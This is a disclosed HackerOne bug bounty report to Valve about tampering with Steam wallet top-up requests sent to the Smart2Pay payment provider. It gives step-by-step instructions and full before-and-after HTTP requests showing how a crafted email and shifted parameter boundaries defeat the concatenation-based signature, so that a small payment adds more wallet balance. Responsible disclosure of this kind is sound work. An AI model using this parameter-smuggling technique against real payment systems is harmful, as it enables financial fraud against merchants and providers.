# Modify in-flight data to payment provider Smart2Pay

## Report Details
- **Report ID**: 1295844
- **URL**: https://hackerone.com/reports/1295844
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-08-09T13:18:20.444Z
- **Disclosed**: 2021-08-10T22:05:36.053Z

## Reporter
- **Username**: drbrix
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: valve

## Vulnerability Information
I have found vulnerability which allows attacker to generate steam wallet balance.

Firstly you will have to change yours steam account email to something like (I will explain why in next steps, amount100 is the important part): 
brixamount100abc@█████

Then go to https://store.steampowered.com/steamaccount/addfunds and click add add funds.

Proceed to payment and select any payment which uses Smart2Pay payment method (przelewy24 in my country).

Click next steps as you would do with normal transaction.

Intercept POST request to https://globalapi.smart2pay.com/

You should see request like that

```
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://store.steampowered.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

MerchantID=1102&MerchantTransactionID=███&Amount=2000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brixamount100abc%40███████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=███
```


We cant change parameters as there is Hash field with signature, however signature is generated like that hash(ALL_FIELDS_NAMES_VALUES_CONTACTED)

For this request it will look like that:

`hash(MerchantID1102MerchantTransactionID█████Amount2000.....)`

So with our special email we can move parameters in a way that will change amount for us

For example, we can change original `Amount=2000` to `Amount2=000` and after contacting it still will be `Amount2000`

Then we can change email from `CustomerEmail=brixamount100abc%40████` to `CustomerEmail=brix&amount=100&ab=c%40█████████` by this we are adding new field amount with our value.

new request should look like that:

```
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://store.steampowered.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

MerchantID=1102&MerchantTransactionID=██████&Amount2=000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brix&amount=100&ab=c%40██████████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=█████████
```

Then just pay 1 $ and you should get your money on steam wallet in few hours/days those are some transactions made with this metod:
2███████3
2████9

and this is account i was testing everything on: 
http://steamcommunity.com/profiles/7656██████████

## Impact

I think impact is pretty obvious, attacker can generate money and break steam market, sell game keys for cheap etc.

## Attachments
No attachments
